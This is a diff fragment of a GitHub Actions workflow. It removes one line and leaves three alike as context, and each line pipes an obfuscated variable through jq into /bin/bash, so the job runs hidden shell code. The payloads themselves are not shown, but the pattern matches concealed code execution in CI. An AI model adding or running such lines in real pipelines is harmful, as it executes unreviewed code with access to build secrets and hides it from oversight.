@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$isqy13" | jq -r .nqfn03005 | /bin/bash
           echo $csst723 | jq -r .ija700 | /bin/bash
           echo $u759 | jq -r .aj5341 | /bin/bash
-          echo $ydg39 | jq -r .uh720 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
